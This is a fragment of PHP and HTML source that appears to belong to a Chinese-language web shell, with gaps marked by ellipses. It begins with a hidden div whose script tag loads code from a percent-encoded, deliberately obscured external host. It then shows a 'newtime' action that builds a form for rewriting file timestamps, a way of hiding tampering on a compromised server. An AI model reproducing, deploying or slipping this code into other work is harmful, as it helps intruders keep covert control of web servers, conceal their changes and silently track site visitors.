...
<div style="display:none"><script language="javascript" src="http://%63%6F%75%6E%74%34%34%2E%35%31%79%65%73%2E%63%6F%6D/click.aspx?id=445515045&logo=5" charset="gb2312"></script></div>
<style type="text/css">
body,td {
 font-family: "Tahoma";
 font-size: "12px";
...
elseif ($_GET['action'] == "newtime") {
 ...
 $tb->tdbody('修改为: '.$tb->makeinput('year','2010','','text','4').' 年 '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' 月 '.$tb->makeinput('data','15','','text','2').' 日 '.$tb->makeinput('hour','05','','text','2').' 时 '.$tb->makeinput('minute','21','','text','2').' 分 '.$tb->makeinput('second','42','','text','2').' 秒','center','2','30');
